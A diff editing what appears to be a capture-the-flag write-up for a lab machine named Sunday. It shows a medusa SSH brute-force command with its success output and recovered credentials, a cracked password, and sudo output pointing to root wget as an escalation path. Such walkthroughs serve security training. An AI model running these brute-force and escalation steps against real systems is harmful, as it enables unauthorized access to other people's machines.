@@ -75,7 +75,7 @@ medusa -h 10.129.8.23 -u sunny -P /usr/share/wordlists/john.lst -M ssh -n 22022 
 ACCOUNT FOUND: [ssh] Host: 10.129.8.23 User: sunny Password: sunday [SUCCESS]
 ```
 
-Credentials: `sunny:sunday` -- honestly, checking `{box_name}` as a password would've saved the brute force.
+Credentials: `sunny:sunday` -- honestly, checking `sunday` as a password would've saved the brute force.
 
 ---
 
@@ -120,7 +120,6 @@ cooldude!        (sammy)
 ```bash
 sudo -l
 # User sammy may run the following commands on sunday:
-#     (ALL) ALL
 #     (root) NOPASSWD: /usr/bin/wget
 ```
 
